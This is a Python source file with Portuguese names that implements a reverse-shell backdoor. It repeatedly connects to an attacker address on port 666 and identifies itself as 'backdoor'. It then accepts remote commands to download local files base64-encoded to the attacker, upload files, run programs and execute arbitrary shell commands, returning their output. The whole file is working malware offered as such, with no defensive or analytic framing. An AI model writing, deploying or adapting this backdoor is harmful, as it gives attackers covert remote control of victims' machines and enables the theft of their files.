import socket, subprocess, time, os, base64

backdoor = 'backdoor'

while True:
    try:
        conexao = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        timeout = 60
        conexao.settimeout(timeout) #7
        conexao.connect(("IP do atacante", 666))
        conexao.send(backdoor.encode('utf-8'))
        while True:
            try:
                comando = conexao.recv(1024).decode('utf-8')
            except socket.timeout:
                a = conexao.send('\r'.encode('utf-8'))
                if not a:
                    conexao.close()
                    break
                else:
                    continue
            if not comando:
                raise Exception
            elif comando.startswith('download'):
                conexao.settimeout(None)
                name_file = comando.split()[1]
                try:
                    content = ''
                    with open(name_file, 'rb') as file:
                        file2 = file.read()
                        content = base64.b64encode(file2).decode('utf-8') + '\n'
                    x = 0
                    while x < len(content):
                        conexao.send(content[x:x+1024].encode('utf-8'))
                        x += 1024
                except IOError:
                    conexao.send('\\'.encode('utf-8'))
                conexao.settimeout(timeout)
            elif comando.startswith('upload'):
                file_upload = comando.split()[1]
                result = ''
                while True:
                    result2 = conexao.recv(1024).decode('utf-8')
                    result += result2
                    if not result2:
                        raise Exception
                    elif result2[-1] == '\n':
                        break
                try:
                    conexao.settimeout(None)
                    with open(file_upload, 'wb') as file:
                        contentb = base64.b64decode(result.encode('utf-8'))
                        file.write(contentb)
                        conexao.send('Upload enviado com sucesso'.encode('utf-8'))
                except IOError:
                    conexao.send('Falha no envio do upload'.encode('utf-8'))
                finally:
                    conexao.settimeout(timeout)
            elif comando.startswith('exec'):
                conexao.settimeout(None)
                cmd = comando.split()[1:]
                execute = subprocess.Popen(cmd, shell=True)
                time.sleep(1)
                if execute.poll() == None or execute.poll() == 0: #61
                    conexao.send('O arquivo foi executado'.encode('utf-8'))
                elif execute.poll() == 1: #63
                    conexao.send('Falha na execucao'.encode('utf-8'))
                conexao.settimeout(timeout)
            else:
                conexao.settimeout(None)
                directory = os.getcwd()
                if comando.startswith('cd'):
                    try:
                        os.chdir(comando.split()[1])
                        directory = os.getcwd()
                    except IndexError:
                        conexao.send(base64.b64encode(directory.encode('utf-8')) + b'\n')
                    except WindowsError as e: #75
                        conexao.send(base64.b64encode(e.strerror.encode('utf-8')) + b'\n')
                    else:
                        conexao.send(bytes('\n', 'utf-8')) #78
                else: #79
                    cmd = subprocess.Popen(comando, shell=True,
                                           stdout=subprocess.PIPE,
                                           stderr=subprocess.PIPE,
                                           cwd=directory) #80
                    result = cmd.stdout.read() + cmd.stderr.read() #81
                    conexao.sendall(base64.b64encode(result) + b'\n')
                conexao.settimeout(timeout)
    except Exception:
        time.sleep(2)



